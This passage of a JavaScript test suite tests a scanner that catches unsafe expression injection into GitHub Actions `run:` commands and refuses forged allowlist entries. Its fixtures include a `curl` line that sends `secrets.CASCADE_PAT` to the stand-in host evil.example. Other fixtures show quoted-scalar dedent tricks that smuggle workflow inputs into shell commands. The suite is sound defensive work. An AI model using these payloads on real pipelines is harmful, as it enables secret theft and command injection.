      forgedProblems[0],
      /began inside an open quoted scalar or flow collection/,
      'a red on a (scalar) link must explain why copying the context will not work',
    );
    assert.match(
      forgedProblems[0],
      /bind the value through a step `env:`/,
      'and must name a remedy that converges -- "rewrite it as a block scalar" did not, because a line inside a '
      + '`run: |` body derives `run (scalar)` and is refused there too',
    );

    // An ordinary unpinned occurrence -- context with no `(scalar)` link -- must
    // NOT carry the hint, or it is noise on every red in the file.
    const ordinary = ci.replace(
      "          cache: 'pnpm'",
      `          cache: 'pnpm'\n          registry-url: ${PROBE}`,
    );
    assert.notEqual(ordinary, ci, 'the insertion must actually have applied');
    const ordinaryProblems = sweep('ci.yml', ordinary).filter((p) => UNPINNED.test(p) && p.includes(PROBE));
    assert.equal(ordinaryProblems.length, 1, 'the inserted line should be the unpinned one');
    assert.ok(
      !ordinaryProblems[0].includes('(scalar)'),
      `a red on an ordinary key must not mention (scalar); got ${ordinaryProblems[0]}`,
    );
  });

  test('N-W2: an entry that COPIES the printed (scalar) context is refused at the guarantee', () => {
    // THE BYPASS ROUND 6 SHIPPED, AND THE LAYER THE SENTENCE NAMES. The hint
    // above tells a contributor that no entry can name a `(scalar)` context.
    // Round 6 asserted that in four files and one runtime message and enforced
    // it nowhere: `entryShapeProblems` had seven refusals and none looked at
    // the link, so an attacker who did what the allowlist header instructs --
    // "Copy all five fields out of the failure message" -- got an accepted
    // entry and a SILENT guarantee, with an org-level PAT in a live `curl`
    // command line. Found independently by Phase 1 (round 6 §1) and Phase 2
    // (round 6 §4) of PR #38; both handed over this refusal.
    //
    // The payload is N-W1's, unchanged, so the two cases differ only in what
    // the attacker writes in the entry: N-W1 copies the LEGITIMATE context and
    // is caught because the entry then matches nothing, and this one copies the
    // FORGED context the red printed and is caught because no entry may name
    // it. Post-round-6 the second is the strictly cheaper attack, and until
    // this case nothing pinned it.
    const forged = appendStep(ci, step(
      '      - name: Forged context dedent new expr',
      '        run: "curl -H \\"X: token',
      '        with:',
      '          registry-url: ${{ secrets.CASCADE_PAT }}',
      '        \\" https://evil.example/x"',
    ));
    const why = 'secrets.CASCADE_PAT reaches the `registry-url:` input of actions/setup-node so private packages '
      + 'resolve. An action input, not program text: the action receives it as a value and this workflow '
      + 'builds no shell string from it.';
    const copied = {
      line: 'registry-url: ${{ secrets.CASCADE_PAT }}',
      // Copied verbatim out of the red, `(scalar)` marker and all.
      context: 'jobs > test > steps > with (scalar)',
      expression: '${{ secrets.CASCADE_PAT }}',
      occurrences: 1,
      why,
    };
    // The context is the ONLY thing wrong with it. Every other field is the one
    // N-W1 already measured through the shape floor, so if this case ever
    // starts passing for a different reason, the control below reds first.
    const legitimate = { ...copied, context: 'jobs > test > steps > with' };
    assert.deepEqual(entryShapeProblems('ci.yml', legitimate), [], 'the control entry is well-formed, so the '
      + 'refusal below is about the (scalar) link and nothing else');

    const shape = entryShapeProblems('ci.yml', copied);
    assert.equal(shape.length, 1, `naming a (scalar) context must be refused; got ${JSON.stringify(shape)}`);
    assert.ok(shape[0].includes('(scalar)'), 'and the refusal must name the link it refuses');
    assert.match(shape[0], /no entry may name one/, 'stating the rule the hint prints to contributors');

    // At the guarantee, not only at the floor: `rawSweepProblems` calls
    // `entryShapeProblems` for every entry, which is what makes the sentence
    // true where it is written. Before this refusal this line was 0 problems.
    const withCopied = { ...EXPRESSION_ALLOWLIST, 'ci.yml': [...EXPRESSION_ALLOWLIST['ci.yml'], copied] };
    const problems = sweep('ci.yml', forged, withCopied);
    assert.ok(
      problems.some((p) => p.includes('(scalar)') && p.includes('secrets.CASCADE_PAT')),
      `the guarantee must refuse the entry by name; got:\n${problems.map((x) => `  - ${x}`).join('\n') || '  (none)'}`,
    );
  });

  test('the discriminator is monotone: it can poison a link, never clean one', () => {
    // WHY THE OTHER 292 PINS DID NOT NEED RE-AUDITING. Dirty state can only
    // ever turn a bare link into a `(scalar)` link. It has no branch that
    // removes one, so it can cost an occurrence its entry -- more problems --
    // and can never make an occurrence match an entry it did not match before.
    //
    // Asserted over a shape, not over a claim: the same two lines, once with a
    // clean opener and once with an open quote, and the second must be a strict
    // lengthening of the first.
    const clean = structuralContexts('a:\n  b:\n    c: ${{ x }}\n');
    const dirty = structuralContexts('a: "open\n  b:\n    c: ${{ x }}\n');
    assert.equal(clean[2], 'a > b', 'two legitimate mapping keys, neither carrying a value');
    // Round 8 moved one marking earlier, and this expectation is what it cost.
    // The links are poisoned as before -- `a (scalar) > b (scalar)` -- and the
    // TRAILING `(scalar)` is the new one: it marks the position of THIS LINE
    // rather than of a frame under it, which is the fact a dedent past the
    // opener used to erase. It is an addition, so monotonicity is intact; the
    // snapshot below is updated rather than loosened, because a `.includes`
    // here would stop the case seeing a marking move.
    assert.equal(
      dirty[2],
      'a (scalar) > b (scalar) (scalar)',
      'both links poisoned once the line began inside a quote, AND the line\'s own position marked',
    );
    assert.ok(
      dirty.every((c, i) => c.length >= clean[i].length),
      'no line may derive a SHORTER context under the discriminator than without it',
    );

    // The same property at the column the pop loop actually crosses: `b:` sits
    // at `k:`'s own indent, so `k`'s frame -- the only frame guaranteed
    // `(scalar)` -- is gone by the time `b:`'s context is recorded. Before
    // round 8 this read `a`, byte-identical to a legitimate key under `a`.
    const dedented = structuralContexts('a:\n  k: "open\n  b: ${{ x }}\n');
    assert.equal(dedented[1], 'a', 'the opener is an ordinary key line under `a`');
    assert.equal(dedented[2], 'a (scalar)', 'and the line that dedents past it is still marked as data');

    // And left of every key in the file, where there is no chain left to poison
    // at all. `(top level)` is exactly what an entry for a workflow-level key
    // would name, so the marking has to survive an empty chain.
    const toTop = structuralContexts('a:\n  k: "open\nb: ${{ x }}\n');
    assert.equal(toTop[2], '(top level) (scalar)', 'an empty chain is marked too, or column 0 is a free pass');
  });


  test('N15: an allowlisted env: line relocated verbatim into a run: body reds', () => {
    const stripped = cascade.replace('          PACKAGE_NAME: ${{ inputs.package-name }}\n', '');
    assert.notEqual(stripped, cascade, 'the removal must actually have applied');
    const mutated = appendStep(stripped, step(
      '      - name: Relocated',
      '        run: |',
      '          PACKAGE_NAME: ${{ inputs.package-name }}',
    ));
    assertReports(sweep('cascade.yml', mutated), UNPINNED, 'a step env: value and a line of bash are not the same');
  });

  test('the context is taken off raw text, and re-indenting alone does not change it', () => {
    // The claim the trimmed line was defended with is still true and still
    // wanted: moving a block left or right is not a change to what it does.
    // What changed is that moving it UNDER A DIFFERENT KEY is.
    const indented = ci.replace(
      '        with:\n          version: ${{ inputs.pnpm-version }}',
      '        with:\n            version: ${{ inputs.pnpm-version }}',
    );
    assert.notEqual(indented, ci, 'the re-indent must actually have applied');
    assert.deepEqual(sweep('ci.yml', indented), [], 're-indenting inside the same key must not red');
  });

  test('the chain is read off the raw text, and these are the chains, hand-read', () => {
    // FACTS ABOUT THE FILES, WRITTEN BY HAND rather than captured from the
    // function's own output. Everything else that mentions a context -- the 36
    // `context:` fields -- was derived from `structuralContexts`, so it agrees
    // with the function by construction and constrains DRIFT but not
    // CORRECTNESS (#37, Phase 4 NEW-6, which measured three mutations of
    // `keyOf`/`contentIndent` at 282 pass / 0 fail against two hand-written
    // facts). One per context kind, read off the file with a text editor.
    const chainOf = (file, needle) => {
      const text = readWorkflowFile(file);
      const at = text.split('\n').findIndex((l) => l.includes(needle));
      assert.notEqual(at, -1, `${needle} must still be in ${file}`);
      return structuralContexts(text)[at];
    };

    assert.equal(chainOf('ci.yml', 'version: ${{ inputs.pnpm-version }}'), 'jobs > test > steps > with');
    assert.equal(chainOf('cascade.yml', 'PACKAGE_NAME: ${{ inputs.package-name }}'), 'jobs > dispatch > steps > env');
    // NOT KEYED TO #34's OWN LINE. This fact was first written against
    // `security-audit.yml`'s `run: pnpm audit --audit-level`, which is exactly
    // the line #34 is going to rewrite. Measured: the #34 landing state written
    // as `run: eval "pnpm audit --audit-level $AUDIT_LEVEL"` was 292 pass /
    // 1 fail, and the single red was THIS assertion failing `must still be in
    // security-audit.yml` -- a churn tripwire on the one change this suite is
    // holding a gate open for, and the third recurrence of that class was what
    // round 5 was briefed to remove. `run: pnpm test` states the same fact and
    // no open issue touches it.
    assert.equal(
      chainOf('ci.yml', 'run: pnpm test'),
      'jobs > test > steps',
      'a step key sits directly under steps:, not under the step name',
    );
    assert.equal(chainOf('npm-publish.yml', 'published-version:'), 'on > workflow_call > outputs');
    assert.equal(chainOf('self-ci.yml', 'group: self-ci-'), 'concurrency');

    // The boundaries: nothing encloses a top-level line, and a `(scalar)` link
    // is what a key that already carries a value contributes.
    assert.equal(structuralContexts('a:\n  b: 1\n')[0], '(top level)', 'a line with no enclosing key says so');
    assert.equal(structuralContexts('a:\n  b: 1\n')[1], 'a');
    assert.equal(structuralContexts('a: 1\n  b: 2\n')[1], 'a (scalar)', 'a key with a value cannot open a mapping');
    assert.equal(structuralContexts('run: |\n  x: 1\n')[1], 'run (scalar)', 'and a block scalar opens no mapping');
  });

  test('the line key is the source line trimmed at the ends and NOWHERE ELSE', () => {
    // The fourth disclosed limit, and until now the only one that lived in the
    // PR body and nowhere in the repo -- `grep -rin "double space\|collaps"
    // test/ README.md docs/` was empty (#37, Phase 5 N-N1). Both normalisations
    // an engineer tidying this key would reach for were measured at 293 pass /
    // 0 fail on THE TREE BEFORE THIS CASE EXISTED, with nothing to stop them --
    // "on this tree" is what that used to say, and it stopped being true the
    // moment this case landed. Re-measured on this tree, each of the two is
    // 308 pass / 1 fail and the one red is this case:
    //
    //   * collapsing internal double spaces, so an entry written for
    //     `a:  ${{ x }}` also exempts `a: ${{ x }}` -- a WIDENING, which is the
    //     move rule 5 forbids by name;
    //   * `trimStart` instead of `trim`, which keeps trailing whitespace and
    //     narrows instead -- fail-closed, but it makes the field something
    //     other than what the message tells a contributor to copy.
    //
    // The key is the line, byte for byte, minus the leading and trailing
    // whitespace that indentation and editors add. Every other byte of it is
    // part of the key.
    const doubled = 'run: echo  "${{ inputs.x }}"\n';
    assert.equal(rawExpressions(doubled)[0].line, doubled.trim(), 'internal spacing is part of the key, not noise');
    assert.notEqual(rawExpressions(doubled)[0].line, 'run: echo "${{ inputs.x }}"');

    const trailing = '  run: echo "${{ inputs.x }}"   \n';
    assert.equal(rawExpressions(trailing)[0].line, trailing.trim(), 'and both ends are trimmed, not just the left');
  });

  test('calibration: the context field discriminates, and the live values are derived', () => {
    // Vacuity guard on the field itself. If `structuralContexts` ever returned
    // one constant, every entry would still match and this suite would be green
    // on a key that discriminates nothing.
    //
    // WHAT USED TO BE HERE was a `deepEqual` against the eight context names the
    // five shipped files happen to use. That was a snapshot of the function's
    // own output, and it was the THIRD RECURRENCE of the churn-tripwire class
    // in this PR -- recreated in the commit that removed the other two. Measured:
    // a correctly-allowlisted job-level `if:` was 281 pass / 1 fail, and
    // reaching 282/0 needed a third edit in a third file, contradicting the
    // two-edits-in-two-files contract the README states (#37, Phase 4 NEW-3).
    // The expected set is DERIVED from the allowlist's own `context` values,
    // which the guarantee already requires to match, so it moves with the file.
    const seen = new Set();
    for (const file of workflowFileNames()) {
      for (const { context } of rawExpressions(readWorkflowFile(file))) seen.add(context);
    }
    const pinned = new Set(Object.values(EXPRESSION_ALLOWLIST).flat().map((e) => e.context));

    assert.ok(seen.size > 1, 'a context that is the same everywhere is not a context');
    assert.deepEqual([...seen].sort(), [...pinned].sort(), 'every derived context is a context an entry states');
    assert.ok(
      [...seen].every((c) => c.includes(CHAIN_SEPARATOR) || c === 'concurrency'),
      'a live context is a chain of enclosing keys; only a top-level key is one segment long',
    );
    assert.ok(
      [...seen].every((c) => !c.includes('(scalar)')),
      'and no live occurrence sits under a key that already carries a value -- if one does, either the file '
      + 'grew a shape this scanner does not model, or a payload is writing its own context',
    );
  });
});

describe('G1 -- a payload dedented PAST its own opener cannot erase the (scalar) link (#37)', () => {
  // PR #38, Phase 3 round 8 §1 -- BLOCKER, and residue that predates this PR
  // rather than a round-7 regression: the reviewer re-applied the payload below
  // to `f6cfe34`, the tree Phase 3 approved, and measured 306 pass / 0 fail
  // there too.
  //
  // WHAT THE ROUND-7 RULE ACTUALLY KEYS ON. `structuralContexts` marks a link
  // `(scalar)` when the line that PUSHED it began inside an open quoted scalar.
  // That is a fact about a frame, and a frame is only reachable from a line
  // that is INDENTED under it. The recorded context of a line is `chain()`
  // taken AFTER the pop loop and BEFORE any dirtiness of that line is
  // considered, so a payload written at or left of its own opener pops the
  // opener's frame -- the one frame guaranteed `(scalar)`, because
  // `valueOf('run: "echo')` is non-empty -- together with every dirty frame
  // above it, and what is left is the clean pre-quote ladder.
  //
  // The D1-D10 rows above never reached this because every one of them dedents
  // the FORGED KEY to the opener's column and then writes the payload one level
  // deeper, so a dirty `with (scalar)` frame is always still on the stack when
  // the payload line is read. None of them dedents the payload line itself past
  // the opener. That is the whole gap, and the shape below is the narrowest
  // statement of it: no forged key at all, just a column number.
  //
  // MEASURED ON THIS TREE, by sweeping the payload's indent 0..12 against the
  // real `npm-publish.yml` (Psych 5.3.1 / libyaml 0.2.5, `Psych.load` on each
  // of the thirteen):
  //
  //   indent  Psych                    derived context                          (scalar)
  //   0       live in `run`            (top level)                              no
  //   1-2     live in `run`            jobs                                     no
  //   3-4     live in `run`            jobs > publish                           no
  //   5-8     live in `run`            jobs > publish > steps                   no
  //   9-12    live in `run`            jobs > publish > steps > run (scalar)    yes
  //
  // Thirteen of thirteen keep `${{ inputs.custom-version }}` inside the `run:`
  // string -- the runner substitutes it before bash parses -- and NINE OF THE
  // THIRTEEN derive a context with no `(scalar)` link anywhere, which an
  // ordinary-looking entry can then name. With that entry written, the
  // guarantee returned `[]` and the suite was 309 pass / 0 fail.
  //
  // AND THE PREMISE THE RULE WAS DERIVED FROM IS FALSE. `raw-expression-scan.js`
  // used to say a double-quoted continuation may sit at "ANY indent greater than
  // the enclosing block mapping's", and that a payload "can LENGTHEN a chain,
  // never shorten one". Re-derived here rather than assumed: 63 documents, key
  // at content indent m = 0..6 in a nested mapping, continuation at indent
  // p = 0..8, `Psych.load` on each -- 63 / 63 keep the payload inside the
  // scalar, INCLUDING every cell where p < m and every cell where p = 0.
  // libyaml imposes no lower bound at all on a quoted continuation, so the
  // chain does shorten and the docstring is corrected with this commit's
  // sibling.
  //
  // ONE ROW PER DISTINCT DERIVED CONTEXT, plus the two controls, because a
  // single column would pass on any rule that happened to fire at that depth.
  // The entry is the reviewer's, verbatim, and it is well-formed on purpose:
  // this is not a malformed-entry test.
  const LEAK_EXPRESSION = '${{ inputs.custom-version }}';
  const leakStep = (indent, quote = '"') => step(
    '      - name: Leak',
    `        run: ${quote}echo`,
    `${' '.repeat(indent)}${LEAK_EXPRESSION}${quote}`,
  );

  const leakEntry = (context) => ({
    context,
    line: `${LEAK_EXPRESSION}"`,
    occurrences: 1,
    expression: LEAK_EXPRESSION,
    why: 'inputs.custom-version is a workflow_call input echoed for diagnostics only; it is not program text at '
      + 'this position and the step does nothing else with it.',
  });

  // Column, and the context the scanner derived for it BEFORE this fix. The
  // second field is what the attacker copies into the entry; it is written out
  // rather than read back from the function so that a change to the derivation
  // reds here instead of silently re-pointing the case at itself.
  const DEDENTS = [
    ['P0  payload at column 0 -- left of every key in the file', 0, '(top level)'],
    ['P1  payload at column 1 -- inside the top-level ladder', 1, 'jobs'],
    ['P3  payload at column 3 -- the job frame', 3, 'jobs > publish'],
    ['P5  payload at column 5 -- the steps frame, one left of the list marker', 5, 'jobs > publish > steps'],
    ['P8  payload at column 8 -- the opener\'s OWN column, the boundary case', 8, 'jobs > publish > steps'],
  ];

  for (const [label, indent, preFixContext] of DEDENTS) {
    test(`${label} -- the guarantee reds on a payload no entry may name`, () => {
      const forged = appendStep(npmPublish, leakStep(indent));
      const openersAdded = (forged.match(/\$\{\{/g) || []).length - (npmPublish.match(/\$\{\{/g) || []).length;
      assert.equal(openersAdded, 1, 'the payload introduces exactly one NEW occurrence, and deletes none');

      const entry = leakEntry(preFixContext);
      const withFresh = {
        ...EXPRESSION_ALLOWLIST,
        'npm-publish.yml': [...EXPRESSION_ALLOWLIST['npm-publish.yml'], entry],
      };
      const problems = sweep('npm-publish.yml', forged, withFresh);
      assert.ok(
        problems.some((p) => p.includes(LEAK_EXPRESSION)),
        'a consumer-controlled input dedented into a live shell command line must red SOMEWHERE, and the problem '
        + `has to be about the payload rather than collateral;\ngot:\n${
          problems.map((x) => `  - ${x}`).join('\n') || '  (none)'}`,
      );
    });
  }

  test('P5q  the single-quoted spelling of the same column reds too', () => {
    // Not double-quote-specific: the single-quoted opener derives the identical
    // `jobs > publish > steps`, so a rule that keyed on `"` alone would leave
    // half the family live.
    const forged = appendStep(npmPublish, leakStep(5, "'"));
    const entry = { ...leakEntry('jobs > publish > steps'), line: `${LEAK_EXPRESSION}'` };
    const withFresh = {
      ...EXPRESSION_ALLOWLIST,
      'npm-publish.yml': [...EXPRESSION_ALLOWLIST['npm-publish.yml'], entry],
    };
    const problems = sweep('npm-publish.yml', forged, withFresh);
    assert.ok(
      problems.some((p) => p.includes(LEAK_EXPRESSION)),
      `the single-quoted dedent must red as well;\ngot:\n${
        problems.map((x) => `  - ${x}`).join('\n') || '  (none)'}`,
    );
  });

  test('the mechanism: a line that BEGAN dirty carries (scalar) on its OWN context, not only on frames under it', () => {
    // ASSERTED DIRECTLY, so the six cases above cannot all pass for an
    // unrelated reason, and stated at the boundary the pop loop actually
    // crosses. `b:` sits at the opener's own column, so the opener's frame is
    // popped before `b:`'s context is recorded -- and `b:` is still data.
    const contexts = structuralContexts('a:\n  k: "open\n  b: ${{ x }}\n');
    assert.equal(contexts[1], 'a', 'the opener itself is a legitimate key line under `a`');
    assert.ok(
      contexts[2].includes('(scalar)'),
      `a line that began inside an open quoted scalar must carry a (scalar) link on its own context even when it `
      + `dedents past its opener; got ${contexts[2]}`,
    );
  });

  test('the (scalar) hint reaches the DEDENTED shape, which is the case it exists for', () => {
    // ROUND 8 §3's FIFTH COST, AND THE REASON IT IS PINNED HERE. `scalarHint`
    // fires off the `(scalar)` link in the derived context. For a payload
    // dedented past its opener there was no such link, so the red a contributor
    // saw was the ordinary "no allowlist entry pins that expression" -- whose
    // stated remedy is "adding one is the review", and adding one WORKED. The
    // one message written to stop this shape was silent in exactly the case it
    // exists for, and the sweep above is what made it audible.
    const PROBE = '${{ inputs.dedent-hint-probe }}';
    const forged = appendStep(npmPublish, step(
      '      - name: Leak',
      '        run: "echo',
      `     ${PROBE}"`,
    ));
    const found = sweep('npm-publish.yml', forged).filter((p) => UNPINNED.test(p) && p.includes(PROBE));
    assert.equal(found.length, 1, 'the dedented payload should be the one unpinned occurrence');
    assert.match(
      found[0],
      /began inside an open quoted scalar or flow collection/,
      'the red on a dedented payload must say why copying its context will not work',
    );
    assert.match(
      found[0],
      /bind the value through a step `env:`/,
      'and must name the remedy that converges, the same one the indented shape gets',
    );
  });

  test('control: the INDENTED spelling of the same payload was already refused', () => {
    // The four columns the round-7 rule did reach. This is not a killing case
    // -- it is green before the fix and after it -- and it is here so that a
    // future reader can see which half of the family was already closed.
    const forged = appendStep(npmPublish, leakStep(10));
    const entry = leakEntry('jobs > publish > steps > run (scalar)');
    assert.equal(
      entryShapeProblems('npm-publish.yml', entry).length,
      1,
      'an entry naming a (scalar) context is refused at the shape floor',
    );
    const withFresh = {
      ...EXPRESSION_ALLOWLIST,
      'npm-publish.yml': [...EXPRESSION_ALLOWLIST['npm-publish.yml'], entry],
    };
    assert.ok(sweep('npm-publish.yml', forged, withFresh).some((p) => p.includes(LEAK_EXPRESSION)));
  });

  test('control: the same forged step carrying NO expression is clean, so the reds above are detection', () => {
    // The shape penalty is not the detection. A quoted multi-line `run:` with
    // an ordinary word where the expression sat must sweep clean, or the six
    // cases above could be passing on the SHAPE of the step rather than on the
    // payload in it.
    const benign = appendStep(npmPublish, step(
      '      - name: Leak',
      '        run: "echo',
      '     benign"',
    ));
    assert.deepEqual(sweep('npm-publish.yml', benign), [], 'a dedented quoted run: with no expression is not a red');
  });
});
